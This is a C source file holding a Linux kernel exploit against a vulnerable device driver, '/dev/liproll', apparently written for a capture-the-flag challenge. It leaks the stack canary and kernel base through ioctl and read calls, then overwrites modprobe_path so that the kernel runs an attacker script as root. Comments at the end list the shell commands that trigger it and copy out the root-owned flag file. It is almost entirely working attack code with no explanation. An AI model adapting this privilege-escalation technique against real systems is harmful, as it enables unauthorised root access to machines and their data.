#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sched.h>
#include <errno.h>
#include <pty.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <signal.h>
#define KERNCALL __attribute__((regparm(3)))
#define _GNU_SOURCE

long int  data[0x400];

void create(int fd){
    ioctl(fd,0xD3C7F03);
}
void choose(int fd,long int index){
	long int arg[1]={index};
    ioctl(fd,0xD3C7F04,arg);
}
void reset(int fd){
    ioctl(fd,0xD3C7F02,index);
}
void cast(int fd,long int* data,long int size){
    long int arg[2]={data,size};
    ioctl(fd,0xD3C7F01,arg);
}
void info(){
     for(int i=0;i<=60;i++){
     printf("%016llx  |  %016llx\n",data[2*i],data[2*i+1]);
     }
}
void shell(){
    system("/bin/sh");
}
unsigned long user_cs, user_ss, user_eflags,user_sp ;
void save_status() {
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3\n"
        "pushfq\n"
        "popq %2\n"
        :"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
        :
        : "memory"
    );
}

size_t magic_read(int fd,size_t addr){
      data[0x100/8]=addr;
      cast(fd,data,0x108);
      read(fd,data,8);
      return data[0];
}
size_t magic_write(int fd,size_t addr){
      data[0x100/8]=addr;
      cast(fd,data,0x108);
      memcpy(data,"/tmp/magic.sh\x00",14);
      cast(fd,data,0x10);
      return data[0];
}
int fd,fd2;

int main(){
    save_status();
    signal(SIGSEGV, shell);
    fd=open("/dev/liproll",0);
    create(fd);
    choose(fd,0);
    read(fd,data,0x200);
    size_t canary=data[32];
    size_t kernel=data[52]-0x20007c;
    info();
    printf("[+]Leaked: %llx %llx\n",canary,kernel);
    magic_write(fd,kernel+0x1448460);
    //printf("[+]Leaked: %llx\n",cc_off);  
}
// modprobe_path:
// /exp
// echo -ne '#!/bin/sh\n/bin/cp /root/flag /tmp/flag\n/bin/chmod 777 /tmp/flag' > /tmp/magic.sh
// echo -ne '\xff\xff\xff\xff' > /tmp/123
// chmod +x /tmp/magic.sh
// chmod +x /tmp/123
// /tmp/123
// cat /tmp/flag
